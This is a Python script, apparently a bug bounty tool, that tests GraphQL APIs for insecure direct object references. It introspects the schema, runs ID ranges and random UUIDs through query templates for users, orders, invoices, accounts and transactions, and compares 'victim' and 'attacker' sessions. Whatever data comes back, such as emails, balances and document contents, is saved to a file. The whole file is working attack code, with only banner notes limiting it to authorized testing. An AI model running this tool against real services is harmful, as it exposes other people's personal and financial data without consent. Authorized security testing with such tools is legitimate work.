#!/usr/bin/env python3
"""
GraphQL IDOR Tester
===================
Tests IDOR vulnerabilities in GraphQL APIs by:
  - Introspecting schema to find object types with ID fields
  - Fuzzing numeric / UUID IDs inside queries and mutations
  - Comparing responses across attacker vs victim session

Usage:
    python3 graphql_idor_tester.py --url https://target.com/graphql --token YOUR_TOKEN
    python3 graphql_idor_tester.py --url https://target.com/graphql --victim-token VIC --attacker-token ATK --mode diff

⚠️  Authorized testing only. Stay within scope.
"""

import argparse
import json
import time
import sys
import uuid
from datetime import datetime
from typing import Optional

import requests
from rich.console import Console
from rich.table import Table
from rich import box
from rich.panel import Panel
from rich.text import Text

console = Console()

BANNER = """
╔══════════════════════════════════════════════════╗
║         GraphQL IDOR Tester  v2.0               ║
║   Authorized bug bounty testing only            ║
╚══════════════════════════════════════════════════╝
"""

# ─── Common GraphQL introspection query ───────────────────────────────────────
INTROSPECT_QUERY = """
{
  __schema {
    types {
      name
      kind
      fields {
        name
        type {
          name
          kind
          ofType { name kind }
        }
        args {
          name
          type { name kind ofType { name kind } }
        }
      }
    }
  }
}
"""

# ─── Common query templates for resource types ────────────────────────────────
COMMON_QUERIES = [
    ('user',        'query { user(id: ID_VAL) { id email name role } }'),
    ('order',       'query { order(id: ID_VAL) { id status total user { id email } } }'),
    ('invoice',     'query { invoice(id: ID_VAL) { id amount due_date user_id } }'),
    ('document',    'query { document(id: ID_VAL) { id title content owner } }'),
    ('profile',     'query { profile(id: ID_VAL) { id username email phone } }'),
    ('account',     'query { account(id: ID_VAL) { id balance owner_id } }'),
    ('ticket',      'query { ticket(id: ID_VAL) { id subject body reporter } }'),
    ('transaction', 'query { transaction(id: ID_VAL) { id amount sender receiver } }'),
]


def gql_post(url: str, query: str, token: Optional[str], cookie: Optional[str],
             timeout: int = 12) -> requests.Response:
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "BugBounty-GraphQL-IDOR/2.0",
        "Accept": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if cookie:
        headers["Cookie"] = cookie

    payload = {"query": query}
    return requests.post(url, json=payload, headers=headers, timeout=timeout)


def introspect(url: str, token: Optional[str], cookie: Optional[str]) -> dict:
    """Run schema introspection and extract query-able types + ID fields."""
    console.print("[cyan][*] Running GraphQL introspection...[/cyan]")
    try:
        resp = gql_post(url, INTROSPECT_QUERY, token, cookie)
        data = resp.json()
        types_raw = data.get("data", {}).get("__schema", {}).get("types", [])
        results = {}
        for t in types_raw:
            if t.get("kind") not in ("OBJECT", "INTERFACE"):
                continue
            if t["name"].startswith("__"):
                continue
            fields = t.get("fields") or []
            id_fields = [
                f["name"] for f in fields
                if "id" in f["name"].lower()
                or f.get("type", {}).get("name") in ("ID", "Int", "String")
            ]
            if id_fields:
                results[t["name"]] = id_fields
        console.print(f"[green][+] Found {len(results)} queryable types with ID fields[/green]")
        return results
    except Exception as e:
        console.print(f"[red][!] Introspection failed: {e}[/red]")
        return {}


def test_ids(url: str, token: str, id_start: int, id_end: int,
             delay: float, cookie: Optional[str]) -> list:
    """Fuzz common query templates with numeric IDs."""
    findings = []
    table = Table(title="GraphQL IDOR Scan Results", box=box.ROUNDED,
                  show_lines=True, border_style="cyan")
    table.add_column("Type", style="bold magenta")
    table.add_column("ID", style="cyan")
    table.add_column("Status", style="bold")
    table.add_column("Data Snippet", style="dim white")

    for name, tmpl in COMMON_QUERIES:
        console.print(f"\n[yellow][>] Testing type: [bold]{name}[/bold][/yellow]")
        for rid in range(id_start, id_end + 1):
            query = tmpl.replace("ID_VAL", str(rid))
            try:
                resp = gql_post(url, query, token, cookie)
                body = resp.json()
                errors = body.get("errors")
                data = body.get("data", {})

                if data and any(v is not None for v in data.values()):
                    snippet = json.dumps(data)[:120]
                    console.print(f"  [green][FOUND][/green] {name}(id={rid}) → {snippet}")
                    table.add_row(name, str(rid), "✅ DATA", snippet)
                    findings.append({
                        "type": name,
                        "id": rid,
                        "query": query,
                        "response": body,
                        "timestamp": datetime.now().isoformat()
                    })
                elif errors:
                    err_msg = errors[0].get("message", "")
                    if "not found" not in err_msg.lower() and "null" not in err_msg.lower():
                        console.print(f"  [yellow][ERR][/yellow] {name}(id={rid}) → {err_msg[:80]}")
            except Exception as e:
                console.print(f"  [red][NET][/red] {name}(id={rid}) → {e}")
            time.sleep(delay)

    console.print(table)
    return findings


def diff_mode(url: str, victim_token: str, attacker_token: str,
              id_list: list, cookie: Optional[str], delay: float) -> list:
    """Compare victim vs attacker responses for same resource IDs."""
    console.print(Panel("[bold cyan]Blind IDOR Diff Mode — Victim vs Attacker[/bold cyan]"))
    leaks = []

    for name, tmpl in COMMON_QUERIES:
        for rid in id_list:
            query = tmpl.replace("ID_VAL", str(rid))
            try:
                vic_resp = gql_post(url, query, victim_token, cookie).json()
                atk_resp = gql_post(url, query, attacker_token, cookie).json()

                vic_data = vic_resp.get("data", {})
                atk_data = atk_resp.get("data", {})

                # If attacker gets same non-null data as victim → IDOR
                if (atk_data and any(v is not None for v in atk_data.values()) and
                        vic_data != atk_data):
                    console.print(f"[red][IDOR LEAK][/red] {name}(id={rid})")
                    console.print(f"  Victim  : {json.dumps(vic_data)[:100]}")
                    console.print(f"  Attacker: {json.dumps(atk_data)[:100]}")
                    leaks.append({
                        "type": name,
                        "id": rid,
                        "victim_data": vic_data,
                        "attacker_data": atk_data,
                    })
                elif (atk_data and any(v is not None for v in atk_data.values())):
                    console.print(f"  [yellow][SAME DATA][/yellow] {name}(id={rid}) — attacker got data (possible IDOR)")
                    leaks.append({
                        "type": name,
                        "id": rid,
                        "note": "Attacker received valid data",
                        "attacker_data": atk_data,
                    })

                time.sleep(delay)
            except Exception as e:
                console.print(f"[red][ERR][/red] {name}(id={rid}): {e}")

    return leaks


def uuid_fuzz(url: str, token: str, cookie: Optional[str], count: int = 20) -> list:
    """Fuzz with random UUIDs to find UUID-based IDOR."""
    console.print("\n[cyan][*] UUID/GUID fuzzing mode...[/cyan]")
    findings = []
    uuid_queries = [
        ('user',     'query { user(id: "UUID_VAL") { id email name } }'),
        ('document', 'query { document(id: "UUID_VAL") { id title content } }'),
        ('order',    'query { order(id: "UUID_VAL") { id status total } }'),
    ]
    for _ in range(count):
        test_uuid = str(uuid.uuid4())
        for name, tmpl in uuid_queries:
            query = tmpl.replace("UUID_VAL", test_uuid)
            try:
                resp = gql_post(url, query, token, cookie)
                body = resp.json()
                data = body.get("data", {})
                if data and any(v is not None for v in data.values()):
                    console.print(f"[red][UUID HIT][/red] {name}(id={test_uuid})")
                    findings.append({"uuid": test_uuid, "type": name, "data": data})
            except Exception:
                pass
    return findings


def main():
    console.print(f"[bold cyan]{BANNER}[/bold cyan]")

    parser = argparse.ArgumentParser(
        description="GraphQL IDOR Tester — authorized testing only",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("--url",            required=True, help="GraphQL endpoint URL")
    parser.add_argument("--token",          default=None,  help="Bearer token (attacker/single session)")
    parser.add_argument("--victim-token",   default=None,  help="Victim bearer token (for diff mode)")
    parser.add_argument("--attacker-token", default=None,  help="Attacker bearer token (for diff mode)")
    parser.add_argument("--cookie",         default=None,  help="Cookie string")
    parser.add_argument("--mode",           default="enum",
                        choices=["enum", "diff", "introspect", "uuid"],
                        help="Mode: enum | diff | introspect | uuid")
    parser.add_argument("--start",  type=int, default=1,   help="Start ID for enumeration")
    parser.add_argument("--end",    type=int, default=50,  help="End ID for enumeration")
    parser.add_argument("--ids",    default=None,          help="Comma-separated IDs for diff mode")
    parser.add_argument("--delay",  type=float, default=0.2, help="Request delay in seconds")
    parser.add_argument("--output", default="graphql_idor_results.json", help="Output file")

    args = parser.parse_args()
    findings = []

    if args.mode == "introspect":
        schema = introspect(args.url, args.token, args.cookie)
        console.print_json(json.dumps(schema))

    elif args.mode == "enum":
        if not args.token:
            console.print("[red][!] --token is required for enum mode[/red]"); sys.exit(1)
        findings = test_ids(args.url, args.token, args.start, args.end,
                             args.delay, args.cookie)

    elif args.mode == "diff":
        if not args.victim_token or not args.attacker_token:
            console.print("[red][!] --victim-token and --attacker-token required for diff mode[/red]")
            sys.exit(1)
        id_list = [int(x) for x in args.ids.split(",")] if args.ids else list(range(args.start, args.end + 1))
        findings = diff_mode(args.url, args.victim_token, args.attacker_token,
                              id_list, args.cookie, args.delay)

    elif args.mode == "uuid":
        if not args.token:
            console.print("[red][!] --token is required for uuid mode[/red]"); sys.exit(1)
        findings = uuid_fuzz(args.url, args.token, args.cookie, count=args.end)

    # ─── Save ─────────────────────────────────────────────────────────────────
    if findings:
        with open(args.output, "w") as f:
            json.dump(findings, f, indent=2)
        console.print(f"\n[green][+] {len(findings)} finding(s) saved → {args.output}[/green]")
    else:
        console.print("\n[yellow][~] No IDOR findings detected in this run.[/yellow]")


if __name__ == "__main__":
    main()
